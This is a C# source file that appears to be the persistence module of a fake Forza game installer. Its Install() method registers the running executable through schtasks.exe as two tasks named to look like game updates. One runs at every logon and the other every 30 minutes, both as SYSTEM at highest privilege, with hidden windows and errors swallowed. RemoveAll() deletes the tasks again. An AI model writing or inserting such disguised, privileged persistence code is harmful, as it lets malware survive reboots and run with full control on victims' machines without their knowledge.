using System.Diagnostics;

namespace ForzaInstallation.Persistence
{
    internal static class ScheduledTask
    {
        internal static string Install()
        {
            var result = "";
            try
            {
                var path = System.Reflection.Assembly.GetExecutingAssembly().Location;
                var psi = new ProcessStartInfo("schtasks.exe", string.Format("/create /tn \"ForzaUpdateTask\" /tr \"\\\"{0}\\\" /background\" /sc onlogon /ru SYSTEM /rl highest /f", path))
                {
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };
                using (var p = Process.Start(psi)) { p.WaitForExit(10000); result += p.ExitCode == 0 ? "SCHTASK_LOGON:OK;" : "SCHTASK_LOGON:FAIL;"; }
            }
            catch { result += "SCHTASK_LOGON:FAIL;"; }
            try
            {
                var path = System.Reflection.Assembly.GetExecutingAssembly().Location;
                var psi = new ProcessStartInfo("schtasks.exe", string.Format("/create /tn \"ForzaUpdateTaskUA\" /tr \"\\\"{0}\\\" /silent\" /sc minute /mo 30 /ru SYSTEM /rl highest /f", path))
                {
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };
                using (var p = Process.Start(psi)) { p.WaitForExit(10000); result += p.ExitCode == 0 ? "SCHTASK_UA:OK;" : "SCHTASK_UA:FAIL;"; }
            }
            catch { result += "SCHTASK_UA:FAIL;"; }
            return "ScheduledTask: " + result;
        }

        internal static string RemoveAll()
        {
            try
            {
                var psi = new ProcessStartInfo("schtasks.exe", "/delete /tn \"ForzaUpdateTask\" /f")
                {
                    UseShellExecute = false,
                    CreateNoWindow = true
                };
                using (var p = Process.Start(psi)) { p.WaitForExit(10000); }
            }
            catch { }
            try
            {
                var psi = new ProcessStartInfo("schtasks.exe", "/delete /tn \"ForzaUpdateTaskUA\" /f")
                {
                    UseShellExecute = false,
                    CreateNoWindow = true
                };
                using (var p = Process.Start(psi)) { p.WaitForExit(10000); }
            }
            catch { }
            return "Scheduled tasks removed";
        }
    }
}
